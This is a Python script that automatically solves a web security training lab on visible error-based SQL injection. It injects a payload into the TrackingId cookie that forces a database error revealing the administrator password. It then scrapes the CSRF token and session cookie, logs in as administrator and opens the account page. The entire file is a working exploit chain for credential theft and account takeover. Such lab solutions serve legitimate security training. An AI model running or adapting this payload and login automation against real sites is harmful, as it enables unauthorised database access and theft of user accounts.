###########################################################################
#
# Lab: Visible error-based SQL injection
#
# Hack Steps:
#      1. Inject payload into 'TrackingId' cookie to make the database
#         return an error containing the administrator password
#      2. Extract the administrator password
#      3. Fetch the login page
#      4. Extract the csrf token and session cookie
#      5. Login as the administrator
#      6. Fetch the administrator profile
#
###########################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0afb00d10368bcc580878a29005c006f.web-security-academy.net"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "TrackingId")
    print(Fore.WHITE + "⦗1⦘ Injecting payload to retrieve the administrator password.. ", end="", flush=True)

    payload = "'%3bSELECT CAST((select password from users limit 1) AS int)-- -"
    cookies = { "TrackingId": payload }
    injection = fetch("/filter?category=Pets", cookies)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting administrator password.. ", end="", flush=True)

    admin_password = re.findall("integer: \"(.*)\"", injection.text)[0]

    print(Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
    print(Fore.WHITE + "⦗3⦘ Fetching the login page.. ", end="", flush=True)

    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)
    
    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Logging in as the administrator.. ", end="", flush=True)

    data = { "username": "administrator", "password": admin_password, "csrf": csrf_token }
    cookies = { "session": session }
    admin_login = post_data("/login", data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the administrator profile.. ", end="", flush=True)

    admin_session = admin_login.cookies.get("session")
    cookies = { "session": admin_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None, headers = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, headers=headers, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()